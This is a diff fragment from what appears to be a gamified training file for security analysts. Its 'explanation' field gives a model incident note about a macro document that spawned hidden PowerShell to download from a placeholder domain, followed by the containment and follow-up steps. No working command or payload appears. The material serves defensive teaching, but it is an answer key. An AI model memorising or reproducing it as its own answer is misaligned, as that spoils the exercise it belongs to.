+        "explanation": "A strong note reads like this: \"Malicious document execution on kf-ws-0188 (user l.okoye). At 10:12 the user opened Invoice_KF-88213.docm; at 10:14:52 WINWORD.EXE launched a hidden powershell.exe with an encoded command that downloads from kestrel-assets-cdn.example, which the host resolved and requested within two seconds. UDM Search over 7 days (NETWORK_DNS and NETWORK_HTTP for the domain) found no other asset. Actions: host isolated 10:31 with approval, sessions revoked, domain blocked at the proxy 10:40. Open: collect the document and the downloaded payload, search mail for the same attachment and sender, reimage before release, reset l.okoye's password. Close reason Malicious, root cause phishing attachment with macro.\" Writing it this way means the next analyst, or an auditor, can repeat every step from the Case Wall alone.",
+        "xp": 40
       }
     ]
   }
